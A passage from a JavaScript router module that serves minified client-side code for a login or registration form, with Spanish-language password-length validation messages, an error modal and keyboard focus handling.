corto"}):t.length<=5?validateResponse({isOk:!1,message:"Error: Contraseña demasiada corta"}):validateResponse({isOk:!0,message:"Formulario válido"})}catch(e){return console.log("EROR => ",e),validateResponse({isOk:!1,message:"Error inesperado en try catch"})}}function validateResponse({isOk:e,message:t}){return e||setTimeout((()=>{showModalMessage(),changeFormStatus(!1)}),1e3),console.log(t),e}document.head.innerHTML=head,document.body.innerHTML=body,document.addEventListener("DOMContentLoaded",setupFormElements),document.querySelector("form").addEventListener("keydown",(function(e){if("Enter"===e.key){const t=document.activeElement;"username"===t.id?(document.getElementById("name").focus(),e.preventDefault()):t.id}}));`
    };
}
export default router;
